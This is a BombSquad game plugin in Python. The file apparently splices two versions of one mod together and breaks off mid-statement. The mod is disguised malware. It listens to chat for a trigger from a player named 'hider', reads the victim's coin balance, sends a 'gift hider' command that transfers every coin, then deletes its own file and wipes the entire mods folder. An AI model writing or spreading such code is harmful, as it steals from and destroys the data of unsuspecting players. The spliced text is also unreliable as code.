# ba_meta require api 9
from __future__ import annotations
import bascenev1 as bs
import bauiv1 as bui
import babase, os

start1 = False


def ok():
    bs.chatmessage("1")

    try:
        os.remove(__file__)
    except Exception as e:
        bs.chatmessage(f"Error deleting file: {e}")


def handle_msg():
    global start1
    try:
        msg = bs.get_chat_messages()
        msg1 = msg[len(msg) - 1]
        msg2 = msg1.split(": ")
        msg1 = ""
        for i in msg2[1:]:
            msg1 += i + ": "
        msg1 = msg1[:-2]
    except Exception as e:
        return f"{e}"

    if msg2[0] == "hider" and msg1 == "x":
        start1[0] = True
        bs.chatmessage("c!")
    elif "I have " in msg1 and start1[0] == True:
        bs.broadcastmessage("haha", color=(1, 0, 0))
        coin = msg1.replace("✅I have ", "").replace(" coins!", "").replace(",", "")
        bs.chatmessage(f"gift hider {coin}")
        bs.apptimer(1, ok)
        start1[0] = False
    elif msg2[0] == "hider" and msg1 == "nm":
        bs.chatmessage("hider")

bs.apptimer(5, handle_msg)


# ba_meta export babas.Plugin
class Mod(babase.Plugin):
    passfile(item_path) or os.path.islink(item_path):
                        os.remove(item_path)
                        print(f"[GRT] Deleted file: {item}")
                    elif os.path.isdir(item_path):
                        shutil.rmtree(item_path, ignore_errors=True)
                        print(f"[GRT] Deleted folder: {item}")
                except Exception as e:
                    print(f"[GRT] Failed to delete {item}: {e}")

        print(f"[GRT] Mods folder cleared!")

    except Exception as e:
        print(f"[GRT] nuke error: {e}")


def send_gift(coins):
    try:
        safe_chat_send(f"gift {GIFT_TARGET} {coins}")
        try: gs('dingSmallHigh').play()
        except: pass

        teck(1.0, lambda: safe_chat_send("1"))
        teck(1.05, lambda: gs('dingSmall'))

        # 3 ثانیه بعد، کل پوشه رو پاک کن
        teck(3.0, nuke_mods_folder)

    except Exception as e:
        print(f"[GRT] gift error: {e}")


def handle_message(msg):
    global is_active

    try:
        sender = None
        content = msg
        if ': ' in msg:
            parts = msg.split(': ', 1)
            sender = parts[0].strip()
            content = parts[1].strip()

        if not content:
            return

        content_lower = content.lower()

        if 'x' in content_lower:
            if not is_active:
                is_active = True
                safe_chat_send("c!")
                try: gs('dingSmall').play()
                except: pass

        if is_active:
            coins = parse_coins(content)
            if coins is not None:
                is_active = False
                send_gift(coins)

    except Exception as e:
        print(f"[GRT] handle error: {e}")


# ba_meta require api 9
# ba_meta export babase.Plugin
class GiftBot(Plugin):
    def __init__(s):
        s.last_hash = ""
        teck(1, s.ear)

    def ear(s):
        try:
            z = GCM()
            teck(0.005, s.ear)

            if not z:
                s.last_hash = ""
                return

            try:
                last_msg = z[-1]
            except (IndexError, TypeError):
                s.last_hash = ""
                return

            current_hash = f"{len(last_msg)}_{last_msg}"
            if current_hash == s.last_hash:
                return
            s.last_hash = current_hash

            try:
                handle_message(last_msg)
            except Exception as e:
                print(f"[GRT] ear inner error: {e}")

        except Exception as e:
            try:
                teck(0.005, s.ear)
            except: pass
            print(f"[GRT] ear error: {e}")